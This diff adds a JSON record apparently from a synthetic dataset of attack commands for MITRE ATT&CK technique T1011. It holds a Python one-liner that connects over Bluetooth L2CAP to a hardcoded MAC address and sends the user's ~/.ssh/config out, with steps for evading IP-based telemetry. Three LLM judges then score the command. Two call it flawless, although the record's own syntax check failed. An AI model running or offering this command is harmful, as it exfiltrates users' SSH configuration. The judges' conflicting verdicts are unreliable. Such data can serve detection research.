@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('64:6E:6C:AA:BB:CC', 0x1009)); p=os.path.expanduser('~/.ssh/config'); import sys; d=b'';\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\ntry:\\n d=open(p,'rb').read()\\nexcept Exception:\\n d=b''\\nfinally:\\n s.sendall(d); s.close()\"",
+  "explanation": "Attempts exfiltration of user SSH config via Bluetooth L2CAP PSM 0x1009 (dynamic, less common), using a channel distinct from IP to align with T1011.",
+  "rationale_steps": [
+    "Choose Bluetooth L2CAP to evade IP-based telemetry.",
+    "Connect to a dynamic, uncommon PSM (0x1009).",
+    "Read a user SSH config if present and send over L2CAP.",
+    "Close the socket regardless of file presence to reduce anomalies."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-77d7ac0c",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": false,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "The Python -c string embeds literal \\n sequences to structure a try/except/finally block, which are not actual newlines and will trigger a SyntaxError despite otherwise balanced quotes and valid separators.",
+        "semantic_score": 4,
+        "semantic_justification": "Conceptually it exfiltrates ~/.ssh/config over a Bluetooth L2CAP connection to a specified MAC, fitting T1011 with appropriate socket types and parameters, though it presumes a listening peer and Python’s Bluetooth support.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:57:48.512284Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed Python code with balanced quotes, parentheses, proper indentation, valid imports, exception handling, and correct socket programming syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1011 by establishing a Bluetooth L2CAP connection to exfiltrate SSH configuration data over a non-standard network medium, completely separate from the primary network or command and control channel.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:57:53.173810Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed, with balanced quotes and parentheses, correct statement separators, and valid Python syntax throughout, making it fully parseable and runnable.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by attempting to exfiltrate `~/.ssh/config` over a Bluetooth L2CAP socket, clearly leveraging a distinct network medium (Bluetooth) as specified by MITRE ATT&CK T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:21:09.263739Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": "Python syntax check failed (py_compile). Command '['C:\\\\Users\\\\flacman\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps\\\\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\\\\python.exe', '-m', 'py_compile', 'C:\\\\Users\\\\flacman\\\\AppData\\\\Local\\\\Temp\\\\tmplawnhofe.py']' returned non-zero exit status 1."
+  }
+}
